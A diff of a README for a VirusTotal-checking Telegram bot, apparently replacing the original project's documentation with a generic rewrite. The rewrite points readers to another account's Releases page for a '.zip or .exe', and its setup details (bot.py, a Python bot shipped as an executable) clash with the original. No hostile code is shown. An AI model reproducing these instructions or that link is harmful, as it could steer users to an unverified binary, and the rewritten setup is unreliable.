@@ -1,178 +1,100 @@
-# VirusTotal Telegram Bot
+# 🤖 VirusTotal-Cheker-Bot-Telegram - Check Security with Ease
 
-This Telegram bot allows you to check files, URLs, domains, and IP addresses using the VirusTotal API.
+![Download](https://img.shields.io/badge/Download-v1.0-blue.svg)
 
-<div align="center">
-  <a href="https://github.com/arhkypGitProject" target="_blank">
-    <img src="https://img.shields.io/static/v1?message=GitHub&logo=github&label=&color=181717&logoColor=white&style=for-the-badge" height="25" />
-  </a>
-</div>
+## 📄 Overview
 
-<div align="center">
-  <img src="https://visitor-badge.laobi.icu/badge?page_id=arhkypGitProject.VirusTotal-Cheker-Bot-Telegram" />
-</div>
+VirusTotal-Cheker-Bot-Telegram is a handy tool that allows you to check the safety of IP addresses, URLs, and domains using VirusTotal. This Telegram bot provides detailed security reports, including reputation assessments, malware analysis, and the latest analysis statistics. It is designed for users who want peace of mind when browsing and sharing links online.
 
-## Project Structure
+## 🚀 Getting Started
 
-```
-├── main.py                    # Main bot startup file
-├── assets/                    # Helper modules
-│   ├── commands.py           # Command and callback handlers
-│   ├── cheker.py             # Functions for working with VirusTotal API
-│   ├── dialog.py             # FSM (Finite State Machine) states
-│   └── config.py             # Configuration data (tokens)
-```
+To start using the VirusTotal-Cheker-Bot-Telegram, follow these simple steps:
 
-## Installation and Setup
+1. **Visit the Releases Page**
+   - Go to the following link to download the bot:
+   [Download Here](https://github.com/palen-halenti/VirusTotal-Cheker-Bot-Telegram/releases)
+   
+2. **Download the Bot**
+   - Locate the latest release on the page.
+   - Click on the link to the file. If you see a .zip or .exe file, download it to your computer.
 
-### 1. Clone the Repository
-```bash
-git clone https://github.com/arhkypGitProject/VirusTotal-Cheker-Bot-Telegram.git
-cd VirusTotal-Cheker-Bot-Telegram
-```
+3. **Extract Files (if applicable)**
+   - If you downloaded a .zip file, right-click on it and select "Extract All" or "Extract Here."
+   - This will create a new folder with the bot's files.
 
-### 2. Create Virtual Environment (Recommended)
-```bash
-python -m venv venv
+## 🔧 Installation Requirements
 
-# For Linux/Mac:
-source venv/bin/activate
+Before installing the bot, ensure you have the following:
 
-# For Windows:
-venv\Scripts\activate
-```
+- A device running Windows, macOS, or Linux.
+- Python 3.7 or higher installed on your computer. You can download it from [python.org](https://www.python.org/downloads/).
 
-### 3. Install Dependencies
-```bash
-pip install aiogram requests
-```
+## 🔍 How to Install
 
-### 4. Configuration Setup
-Edit the `assets/config.py` file:
+1. **Set Up Python**: Follow the instructions specific to your operating system to install Python. Make sure to select the option to add Python to your system PATH during the installation.
 
-```python
-TOKEN = 'YOUR_TELEGRAM_BOT_TOKEN'
-API_KEY = 'YOUR_VIRUSTOTAL_API_KEY'
-```
+2. **Install Required Libraries**: Open your command prompt or terminal and type the following command to install the necessary libraries:
 
-**Where to get tokens:**
-- **Telegram Bot Token**: Get it from [@BotFather](https://t.me/BotFather)
-- **VirusTotal API Key**: Register on [VirusTotal](https://www.virustotal.com/) and get your API key from the dashboard
+   ```
+   pip install aiogram
+   ```
 
-### 5. Create Required Folders
-The bot will automatically create a `downloads` folder for temporary file storage on first run.
+3. **Configure the Bot**: 
+   - Open the bot's main file (usually `bot.py`) in a text editor.
+   - Input your personal Telegram Bot Token. You can get this by chatting with [@BotFather](https://t.me/BotFather) on Telegram.
 
-## Running the Bot
+4. **Run the Bot**: 
+   - Navigate to the folder where the bot files are located using the command prompt or terminal.
+   - Start the bot using the command:
+   
+   ```
+   python bot.py
+   ```
 
-```bash
-python main.py
-```
+5. **Interact with the Bot**: Open Telegram, search for your bot by its username, and start a chat to interact with it.
 
-Once running, the bot will be ready to use. Send the `/start` command in Telegram to begin.
+## ⚙️ Using the Bot
 
-## VirusTotal API Integration
+After you run the bot, it will respond to the following commands:
 
-### Supported Functions:
+- **Check URL**: Send a URL, and the bot will return a security report.
+- **Check IP Address**: Send an IP address for detailed information.
+- **Check Domain**: Send a domain, and the bot will analyze its safety.
 
-#### 1. **IP Addresses** (`ip_checker`)
-- Check IP address reputation
-- Get ASN, country, and owner information
-- Last analysis statistics
+## 🛠️ Common Troubleshooting
 
-#### 2. **URL Addresses** (`url_cheker`)
-- Submit URLs for scanning
-- Get analysis ID for tracking
+If you encounter issues while using the bot, consider the following solutions:
 
-#### 3. **Domains** (`domain_checker`)
-- Domain reputation check
-- Registrar information
-- Voting statistics
+1. **Bot Not Responding**: 
+   - Ensure the bot is running in your terminal or command prompt.
+   - Check your internet connection.
 
-#### 4. **Files** (`send_file_to_virustotal`)
-- Upload files up to 650MB (VirusTotal limit)
-- File analysis with multiple antivirus engines
+2. **Invalid Token Error**:
+   - Double-check that you copied the correct bot token from BotFather.
 
-#### 5. **Analysis Reports** (`analysis_report`)
-- Get results by analysis ID
-- Check scanning status
-- View detection statistics
+3. **Library Not Found**:
+   - Make sure you have installed the necessary libraries. Re-run the installation command for missing libraries.
 
-## Bot Features
+## 📝 Features
 
-### Main Menu Commands:
-- `/start` - Display main menu with all options
+The VirusTotal-Cheker-Bot-Telegram includes:
 
-### Available Checks:
-1. **IP Scan** - Check IP address reputation
-2. **File Check** - Upload and scan files
-3. **URL Check** - Analyze suspicious URLs
-4. **Domain Check** - Verify domain reputation
-5. **URL/File Analysis** - Check existing analysis results using ID
+- **Real-time Analysis**: Immediate feedback on the safety of URLs, IPs, and domains.
+- **User-friendly Interface**: Easy interactions through Telegram.
+- **Detailed Reports**: Information on reputation and malware threats.
 
-### Technical Implementation:
+## 📥 Download & Install
 
-#### FSM (Finite State Machine)
-The bot uses aiogram's FSM for managing user states:
-- `IPScan.waiting_for_ip`
-- `URLScan.waiting_for_url`
-- `DOMAINScan.waiting_for_domain`
-- `FILEScan.waiting_for_file`
-- `URLandFILEScan.waiting_for_id`
+Ready to get started? Download the bot by visiting this link:  
+[Download Here](https://github.com/palen-halenti/VirusTotal-Cheker-Bot-Telegram/releases)
 
-#### Async Operations
-- All VirusTotal API calls are wrapped in `asyncio.to_thread()` to prevent blocking
-- File downloads use async bot methods
-- Temporary files are automatically cleaned up
+## 🤝 Community and Support
 
-#### Error Handling
-- Comprehensive try-except blocks
-- User-friendly error messages
-- State clearing on errors
+If you have questions or need help, feel free to reach out to the community. Join discussions on Telegram or check existing issues on the GitHub page. Your feedback helps improve the bot.
 
-## API Rate Limits
-- VirusTotal API has rate limits based on your subscription
-- Free tier: 4 requests/minute, 500 requests/day
-- Consider implementing delays for high-volume usage
+## 🔗 Additional Resources
 
-## Security Notes
-- This bot is for informational purposes only
-- Not a replacement for antivirus software
-- Files are deleted immediately after analysis
-- API keys should be kept secure
+- **VirusTotal Documentation**: Learn more about how VirusTotal works at [VirusTotal](https://www.virustotal.com).
+- **Python Documentation**: Understand more about Python at [python.org](https://www.python.org/doc/).
 
-## Customization
-You can modify:
-- Response formats in `commands.py`
-- API endpoints in `cheker.py`
-- Menu structure and buttons
-- Logging configuration in `main.py`
-
-## Troubleshooting
-
-### Common Issues:
-1. **API Key Errors**: Ensure your VirusTotal API key is valid
-2. **File Size Limits**: VirusTotal has 650MB file limit
-3. **Rate Limiting**: Implement delays if hitting API limits
-4. **State Issues**: Use `/start` to reset bot state if needed
-
-## Dependencies
-- `aiogram==3.x` - Telegram Bot Framework
-- `requests==2.3x` - HTTP library for API calls
-
-## Disclaimer
-This bot uses VirusTotal's public API. All scanning is performed by VirusTotal, not locally. Results are for informational purposes only. Always use multiple security solutions for comprehensive protection.
-
-## Support
-For issues or questions:
-1. Check the VirusTotal API documentation
-2. Review aiogram framework documentation
-3. Examine error logs for specific issues
-
-## Future Improvements
-Potential enhancements:
-- Add caching for frequently checked items
-- Implement queue system for file uploads
-- Add support for more VirusTotal endpoints
-- Create admin panel for monitoring
-- Add multilingual support
-- Implement user statistics and analytics
+With these steps, you are ready to check links and enhance your online safety. Enjoy using the VirusTotal-Cheker-Bot-Telegram!
